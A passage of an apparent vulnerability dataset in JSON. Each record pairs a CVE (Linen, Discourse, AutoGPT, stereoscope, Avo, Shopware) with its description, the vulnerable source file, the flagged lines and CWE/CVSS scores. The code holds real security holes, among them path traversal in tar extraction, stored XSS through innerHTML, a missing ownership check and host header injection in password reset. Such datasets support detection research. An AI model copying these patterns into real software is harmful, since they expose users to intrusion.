        {
          "name": "apps/web/pages/api/forgot-password/index.ts",
          "content": "import { NextApiRequest, NextApiResponse } from 'next/types';\nimport ResetPasswordMailer from 'mailers/ResetPasswordMailer';\nimport { generateToken } from 'utilities/token';\nimport { prisma } from '@linen/database';\nimport { getHostFromHeaders } from '@linen/utilities/domain';\nimport { cors, preflight } from 'utilities/cors';\n\nasync function create(request: NextApiRequest, response: NextApiResponse) {\n  const { email, origin } = JSON.parse(request.body);\n\n  if (!email) {\n    return response.status(400).json({ error: 'Email is required' });\n  }\n  try {\n    const token = generateToken();\n\n    const auth = await prisma.auths.findFirst({ where: { email } });\n\n    if (!auth) {\n      return response.status(200).json({});\n    }\n\n    await prisma.auths.update({\n      where: { email },\n      data: {\n        token,\n      },\n    });\n\n    await ResetPasswordMailer.send({\n      to: email,\n      host: origin || getHostFromHeaders(request.headers),\n      token,\n    });\n  } catch (exception) {\n    console.error(exception);\n    return response.status(200).json({});\n  }\n\n  return response.status(200).json({});\n}\n\nasync function handler(request: NextApiRequest, response: NextApiResponse) {\n  if (request.method === 'OPTIONS') {\n    return preflight(request, response, ['POST']);\n  }\n  cors(request, response);\n  if (request.method === 'POST') {\n    return create(request, response);\n  }\n  return response.status(405).json({});\n}\n\nexport default handler;\n"
        }
      ],
      "method_level": [
        "create"
      ],
      "hunk_level": [
        {
          "line_no": 32,
          "content": "      host: origin || getHostFromHeaders(request.headers),"
        }
      ]
    },
    "cwe": [
      "CWE-284"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 1015,
    "cve": "CVE-2024-37299",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, crafting requests to submit very long tag group names can reduce the availability of a Discourse instance. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 68,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 69,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.9,
    "cvss_version": 3.1
  },
  {
    "id": 5,
    "cve": "CVE-2025-53944",
    "description": "AutoGPT is a platform that allows users to create, deploy, and manage continuous artificial intelligence agents. In v0.6.15 and below, the external API's get_graph_execution_results endpoint has an authorization bypass vulnerability. While it correctly validates user access to the graph_id, it fails to verify ownership of the graph_exec_id parameter, allowing authenticated users to access any execution results by providing arbitrary execution IDs. The internal API implements proper validation for both parameters. This is fixed in v0.6.16.",
    "vulnerability": {
      "file_level": [
        {
          "name": "autogpt_platform/backend/backend/server/external/routes/v1.py",
          "content": "import logging\nfrom collections import defaultdict\nfrom typing import Annotated, Any, Dict, List, Optional, Sequence\n\nfrom fastapi import APIRouter, Body, Depends, HTTPException\nfrom prisma.enums import AgentExecutionStatus, APIKeyPermission\nfrom typing_extensions import TypedDict\n\nimport backend.data.block\nfrom backend.data import execution as execution_db\nfrom backend.data import graph as graph_db\nfrom backend.data.api_key import APIKey\nfrom backend.data.block import BlockInput, CompletedBlockOutput\nfrom backend.data.execution import NodeExecutionResult\nfrom backend.executor.utils import add_graph_execution\nfrom backend.server.external.middleware import require_permission\nfrom backend.util.settings import Settings\n\nsettings = Settings()\nlogger = logging.getLogger(__name__)\n\nv1_router = APIRouter()\n\n\nclass NodeOutput(TypedDict):\n    key: str\n    value: Any\n\n\nclass ExecutionNode(TypedDict):\n    node_id: str\n    input: Any\n    output: Dict[str, Any]\n\n\nclass ExecutionNodeOutput(TypedDict):\n    node_id: str\n    outputs: List[NodeOutput]\n\n\nclass GraphExecutionResult(TypedDict):\n    execution_id: str\n    status: str\n    nodes: List[ExecutionNode]\n    output: Optional[List[Dict[str, str]]]\n\n\ndef get_outputs_with_names(results: list[NodeExecutionResult]) -> list[dict[str, str]]:\n    outputs = []\n    for result in results:\n        if \"output\" in result.output_data:\n            output_value = result.output_data[\"output\"][0]\n            name = result.output_data.get(\"name\", [None])[0]\n            if output_value and name:\n                outputs.append({name: output_value})\n    return outputs\n\n\n@v1_router.get(\n    path=\"/blocks\",\n    tags=[\"blocks\"],\n    dependencies=[Depends(require_permission(APIKeyPermission.READ_BLOCK))],\n)\ndef get_graph_blocks() -> Sequence[dict[Any, Any]]:\n    blocks = [block() for block in backend.data.block.get_blocks().values()]\n    return [b.to_dict() for b in blocks if not b.disabled]\n\n\n@v1_router.post(\n    path=\"/blocks/{block_id}/execute\",\n    tags=[\"blocks\"],\n    dependencies=[Depends(require_permission(APIKeyPermission.EXECUTE_BLOCK))],\n)\nasync def execute_graph_block(\n    block_id: str,\n    data: BlockInput,\n    api_key: APIKey = Depends(require_permission(APIKeyPermission.EXECUTE_BLOCK)),\n) -> CompletedBlockOutput:\n    obj = backend.data.block.get_block(block_id)\n    if not obj:\n        raise HTTPException(status_code=404, detail=f\"Block #{block_id} not found.\")\n\n    output = defaultdict(list)\n    async for name, data in obj.execute(data):\n        output[name].append(data)\n    return output\n\n\n@v1_router.post(\n    path=\"/graphs/{graph_id}/execute/{graph_version}\",\n    tags=[\"graphs\"],\n)\nasync def execute_graph(\n    graph_id: str,\n    graph_version: int,\n    node_input: Annotated[dict[str, Any], Body(..., embed=True, default_factory=dict)],\n    api_key: APIKey = Depends(require_permission(APIKeyPermission.EXECUTE_GRAPH)),\n) -> dict[str, Any]:\n    try:\n        graph_exec = await add_graph_execution(\n            graph_id=graph_id,\n            user_id=api_key.user_id,\n            inputs=node_input,\n            graph_version=graph_version,\n        )\n        return {\"id\": graph_exec.id}\n    except Exception as e:\n        msg = str(e).encode().decode(\"unicode_escape\")\n        raise HTTPException(status_code=400, detail=msg)\n\n\n@v1_router.get(\n    path=\"/graphs/{graph_id}/executions/{graph_exec_id}/results\",\n    tags=[\"graphs\"],\n)\nasync def get_graph_execution_results(\n    graph_id: str,\n    graph_exec_id: str,\n    api_key: APIKey = Depends(require_permission(APIKeyPermission.READ_GRAPH)),\n) -> GraphExecutionResult:\n    graph = await graph_db.get_graph(graph_id, user_id=api_key.user_id)\n    if not graph:\n        raise HTTPException(status_code=404, detail=f\"Graph #{graph_id} not found.\")\n\n    results = await execution_db.get_node_executions(graph_exec_id)\n    last_result = results[-1] if results else None\n    execution_status = (\n        last_result.status if last_result else AgentExecutionStatus.INCOMPLETE\n    )\n    outputs = get_outputs_with_names(results)\n\n    return GraphExecutionResult(\n        execution_id=graph_exec_id,\n        status=execution_status,\n        nodes=[\n            ExecutionNode(\n                node_id=result.node_id,\n                input=result.input_data.get(\"value\", result.input_data),\n                output={k: v for k, v in result.output_data.items()},\n            )\n            for result in results\n        ],\n        output=outputs if execution_status == AgentExecutionStatus.COMPLETED else None,\n    )\n"
        }
      ],
      "method_level": [
        "def get_outputs_with_names(results: list[NodeExecutionResult]) -> list[dict[str, str]]:\n    outputs = []\n    for result in results:\n        if \"output\" in result.output_data:\n            output_value = result.output_data[\"output\"][0]\n            name = result.output_data.get(\"name\", [None])[0]\n            if output_value and name:\n                outputs.append({name: output_value})\n    return outputs"
      ],
      "hunk_level": [
        {
          "line_no": 48,
          "content": "def get_outputs_with_names(results: list[NodeExecutionResult]) -> list[dict[str, str]]:"
        },
        {
          "line_no": 49,
          "content": "    outputs = []"
        },
        {
          "line_no": 50,
          "content": "    for result in results:"
        },
        {
          "line_no": 51,
          "content": "        if \"output\" in result.output_data:"
        },
        {
          "line_no": 52,
          "content": "            output_value = result.output_data[\"output\"][0]"
        },
        {
          "line_no": 53,
          "content": "            name = result.output_data.get(\"name\", [None])[0]"
        },
        {
          "line_no": 54,
          "content": "            if output_value and name:"
        },
        {
          "line_no": 55,
          "content": "                outputs.append({name: output_value})"
        },
        {
          "line_no": 56,
          "content": "    return outputs"
        }
      ]
    },
    "cwe": [
      "CWE-285",
      "CWE-639"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 3.1
  },
  {
    "id": 187,
    "cve": "CVE-2024-24579",
    "description": "stereoscope is a go library for processing container images and simulating a squash filesystem.  Prior to version 0.0.1, it is possible to craft an OCI tar archive that, when stereoscope attempts to unarchive the contents, will result in writing to paths outside of the unarchive temporary directory. Specifically, use of `github.com/anchore/stereoscope/pkg/file.UntarToDirectory()` function, the  `github.com/anchore/stereoscope/pkg/image/oci.TarballImageProvider` struct, or the higher level `github.com/anchore/stereoscope/pkg/image.Image.Read()` function express this vulnerability. As a workaround, if you are using the OCI archive as input into stereoscope then you can switch to using an OCI layout by unarchiving the tar archive and provide the unarchived directory to stereoscope.",
    "vulnerability": {
      "file_level": [
        {
          "name": "pkg/file/tarutil.go",
          "content": "package file\n\nimport (\n\t\"archive/tar\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"github.com/pkg/errors\"\n\n\t\"github.com/anchore/stereoscope/internal/log\"\n)\n\nconst perFileReadLimit = 2 * GB\n\nvar ErrTarStopIteration = fmt.Errorf(\"halt iterating tar\")\n\n// tarFile is a ReadCloser of a tar file on disk.\ntype tarFile struct {\n\tio.Reader\n\tio.Closer\n}\n\n// TarFileEntry represents the header, contents, and list position of an entry within a tar file.\ntype TarFileEntry struct {\n\tSequence int64\n\tHeader   tar.Header\n\tReader   io.Reader\n}\n\n// TarFileVisitor is a visitor function meant to be used in conjunction with the IterateTar.\ntype TarFileVisitor func(TarFileEntry) error\n\n// ErrFileNotFound returned from ReaderFromTar if a file is not found in the given archive.\ntype ErrFileNotFound struct {\n\tPath string\n}\n\nfunc (e *ErrFileNotFound) Error() string {\n\treturn fmt.Sprintf(\"file not found (path=%s)\", e.Path)\n}\n\n// IterateTar is a function that reads across a tar and invokes a visitor function for each entry discovered. The iterator\n// stops when there are no more entries to read, if there is an error in the underlying reader or visitor function,\n// or if the visitor function returns a ErrTarStopIteration sentinel error.\nfunc IterateTar(reader io.Reader, visitor TarFileVisitor) error {\n\ttarReader := tar.NewReader(reader)\n\tvar sequence int64 = -1\n\tfor {\n\t\tsequence++\n\n\t\thdr, err := tarReader.Next()\n\t\tif errors.Is(err, io.EOF) {\n\t\t\tbreak\n\t\t}\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tif hdr == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tif err := visitor(TarFileEntry{\n\t\t\tSequence: sequence,\n\t\t\tHeader:   *hdr,\n\t\t\tReader:   tarReader,\n\t\t}); err != nil {\n\t\t\tif errors.Is(err, ErrTarStopIteration) {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\treturn fmt.Errorf(\"failed to visit tar entry=%q : %w\", hdr.Name, err)\n\t\t}\n\t}\n\treturn nil\n}\n\n// ReaderFromTar returns a io.ReadCloser for the Path within a tar file.\nfunc ReaderFromTar(reader io.ReadCloser, tarPath string) (io.ReadCloser, error) {\n\tvar result io.ReadCloser\n\n\tvisitor := func(entry TarFileEntry) error {\n\t\tif entry.Header.Name == tarPath {\n\t\t\tresult = &tarFile{\n\t\t\t\tReader: entry.Reader,\n\t\t\t\tCloser: reader,\n\t\t\t}\n\t\t\treturn ErrTarStopIteration\n\t\t}\n\t\treturn nil\n\t}\n\tif err := IterateTar(reader, visitor); err != nil {\n\t\treturn nil, err\n\t}\n\n\tif result == nil {\n\t\treturn nil, &ErrFileNotFound{tarPath}\n\t}\n\n\treturn result, nil\n}\n\n// MetadataFromTar returns the tar metadata from the header info.\nfunc MetadataFromTar(reader io.ReadCloser, tarPath string) (Metadata, error) {\n\tvar metadata *Metadata\n\tvisitor := func(entry TarFileEntry) error {\n\t\tif entry.Header.Name == tarPath {\n\t\t\tvar content io.Reader\n\t\t\tif entry.Header.Size > 0 {\n\t\t\t\tcontent = reader\n\t\t\t}\n\t\t\tm := NewMetadata(entry.Header, content)\n\t\t\tmetadata = &m\n\t\t\treturn ErrTarStopIteration\n\t\t}\n\t\treturn nil\n\t}\n\tif err := IterateTar(reader, visitor); err != nil {\n\t\treturn Metadata{}, err\n\t}\n\tif metadata == nil {\n\t\treturn Metadata{}, &ErrFileNotFound{tarPath}\n\t}\n\treturn *metadata, nil\n}\n\n// UntarToDirectory writes the contents of the given tar reader to the given destination\nfunc UntarToDirectory(reader io.Reader, dst string) error {\n\tvisitor := func(entry TarFileEntry) error {\n\t\ttarget := filepath.Join(dst, entry.Header.Name)\n\n\t\tswitch entry.Header.Typeflag {\n\t\tcase tar.TypeDir:\n\t\t\tif _, err := os.Stat(target); err != nil {\n\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n\t\t\t}\n\n\t\tcase tar.TypeReg:\n\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\n\t\t\t// limit the reader on each file read to prevent decompression bomb attacks\n\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n\t\t\t}\n\t\t\tif err != nil {\n\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)\n\t\t\t}\n\n\t\t\tif err = f.Close(); err != nil {\n\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\t}\n\n\treturn IterateTar(reader, visitor)\n}\n"
        }
      ],
      "method_level": [
        "func UntarToDirectory(reader io.Reader, dst string) error {\n\tvisitor := func(entry TarFileEntry) error {\n\t\ttarget := filepath.Join(dst, entry.Header.Name)\n\n\t\tswitch entry.Header.Typeflag {\n\t\tcase tar.TypeDir:\n\t\t\tif _, err := os.Stat(target); err != nil {\n\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n\t\t\t}\n\n\t\tcase tar.TypeReg:\n\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\n\t\t\t// limit the reader on each file read to prevent decompression bomb attacks\n\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))\n\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {\n\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")\n\t\t\t}\n\t\t\tif err != nil {\n\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)\n\t\t\t}\n\n\t\t\tif err = f.Close(); err != nil {\n\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\t}\n\n\treturn IterateTar(reader, visitor)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 129,
          "content": "\tvisitor := func(entry TarFileEntry) error {"
        },
        {
          "line_no": 130,
          "content": "\t\ttarget := filepath.Join(dst, entry.Header.Name)"
        },
        {
          "line_no": 132,
          "content": "\t\tswitch entry.Header.Typeflag {"
        },
        {
          "line_no": 133,
          "content": "\t\tcase tar.TypeDir:"
        },
        {
          "line_no": 134,
          "content": "\t\t\tif _, err := os.Stat(target); err != nil {"
        },
        {
          "line_no": 135,
          "content": "\t\t\t\tif err := os.MkdirAll(target, 0755); err != nil {"
        },
        {
          "line_no": 136,
          "content": "\t\t\t\t\treturn err"
        },
        {
          "line_no": 137,
          "content": "\t\t\t\t}"
        },
        {
          "line_no": 138,
          "content": "\t\t\t}"
        },
        {
          "line_no": 140,
          "content": "\t\tcase tar.TypeReg:"
        },
        {
          "line_no": 141,
          "content": "\t\t\tf, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(entry.Header.Mode))"
        },
        {
          "line_no": 142,
          "content": "\t\t\tif err != nil {"
        },
        {
          "line_no": 146,
          "content": "\t\t\t// limit the reader on each file read to prevent decompression bomb attacks"
        },
        {
          "line_no": 147,
          "content": "\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))"
        },
        {
          "line_no": 148,
          "content": "\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {"
        },
        {
          "line_no": 149,
          "content": "\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")"
        },
        {
          "line_no": 150,
          "content": "\t\t\t}"
        },
        {
          "line_no": 151,
          "content": "\t\t\tif err != nil {"
        },
        {
          "line_no": 152,
          "content": "\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)"
        },
        {
          "line_no": 153,
          "content": "\t\t\t}"
        },
        {
          "line_no": 155,
          "content": "\t\t\tif err = f.Close(); err != nil {"
        },
        {
          "line_no": 156,
          "content": "\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)"
        },
        {
          "line_no": 157,
          "content": "\t\t\t}"
        },
        {
          "line_no": 159,
          "content": "\t\treturn nil"
        },
        {
          "line_no": 160,
          "content": "\t}"
        },
        {
          "line_no": 162,
          "content": "\treturn IterateTar(reader, visitor)"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 87,
    "cve": "CVE-2024-22191",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. A stored cross-site scripting (XSS) vulnerability was found in the key_value field of Avo v3.2.3 and v2.46.0. This vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser. The value of the key_value is inserted directly into the HTML code. In the current version of Avo (possibly also older versions), the value is not properly sanitized before it is inserted into the HTML code. This vulnerability could be used to steal sensitive information from victims that could be used to hijack victims' accounts or redirect them to malicious websites. Avo 3.2.4 and 2.47.0 include a fix for this issue. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.3,
    "cvss_version": 3.1
  },
  {
    "id": 1063,
    "cve": "CVE-2024-42356",
    "description": "Shopware is an open commerce platform. Prior to versions 6.6.5.1 and 6.5.8.13, the `context` variable is injected into almost any Twig Template and allows to access to current language, currency information. The context object allows also to switch for a short time the scope of the Context as a helper with a callable function. The function can be called also from Twig and as the second parameter allows any callable, it's possible to call from Twig any statically callable PHP function/method. It's not possible as customer to provide any Twig code, the attacker would require access to Administration to exploit it using Mail templates or using App Scripts. Update to Shopware 6.6.5.1 or 6.5.8.13 to receive a patch. For older versions of 6.1, 6.2, 6.3 and 6.4 corresponding security measures are also available via a plugin.",
    "vulnerability": {
      "file_level": [
        {
          "name": "Framework/Context.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Shopware\\Core\\Framework;\n\nuse Shopware\\Core\\Checkout\\Cart\\Price\\Struct\\CartPrice;\nuse Shopware\\Core\\Defaults;\nuse Shopware\\Core\\Framework\\Api\\Context\\AdminApiSource;\nuse Shopware\\Core\\Framework\\Api\\Context\\ContextSource;\nuse Shopware\\Core\\Framework\\Api\\Context\\SystemSource;\nuse Shopware\\Core\\Framework\\DataAbstractionLayer\\Pricing\\CashRoundingConfig;\nuse Shopware\\Core\\Framework\\Log\\Package;\nuse Shopware\\Core\\Framework\\Struct\\StateAwareTrait;\nuse Shopware\\Core\\Framework\\Struct\\Struct;\nuse Shopware\\Core\\System\\SalesChannel\\Exception\\ContextRulesLockedException;\nuse Symfony\\Component\\Serializer\\Annotation\\Ignore;\n\n#[Package('core')]\nclass Context extends Struct\n{\n    use StateAwareTrait;\n\n    final public const SYSTEM_SCOPE = 'system';\n    final public const USER_SCOPE = 'user';\n    final public const CRUD_API_SCOPE = 'crud';\n\n    final public const SKIP_TRIGGER_FLOW = 'skipTriggerFlow';\n\n    /**\n     * @var non-empty-array<string>\n     */\n    protected array $languageIdChain;\n\n    protected string $scope = self::USER_SCOPE;\n\n    protected bool $rulesLocked = false;\n\n    #[Ignore]\n    protected $extensions = [];\n\n    /**\n     * @param array<string> $languageIdChain\n     * @param array<string> $ruleIds\n     */\n    public function __construct(\n        protected ContextSource $source,\n        protected array $ruleIds = [],\n        protected string $currencyId = Defaults::CURRENCY,\n        array $languageIdChain = [Defaults::LANGUAGE_SYSTEM],\n        protected string $versionId = Defaults::LIVE_VERSION,\n        protected float $currencyFactor = 1.0,\n        protected bool $considerInheritance = false,\n        /**\n         * @see CartPrice::TAX_STATE_GROSS, CartPrice::TAX_STATE_NET, CartPrice::TAX_STATE_FREE\n         */\n        protected string $taxState = CartPrice::TAX_STATE_GROSS,\n        protected CashRoundingConfig $rounding = new CashRoundingConfig(2, 0.01, true)\n    ) {\n        if ($source instanceof SystemSource) {\n            $this->scope = self::SYSTEM_SCOPE;\n        }\n\n        if (empty($languageIdChain)) {\n            throw new \\InvalidArgumentException('Argument languageIdChain must not be empty');\n        }\n\n        /** @var non-empty-array<string> $chain */\n        $chain = array_keys(array_flip(array_filter($languageIdChain)));\n        $this->languageIdChain = $chain;\n    }\n\n    /**\n     * @internal\n     */\n    public static function createDefaultContext(?ContextSource $source = null): self\n    {\n        $source ??= new SystemSource();\n\n        return new self($source);\n    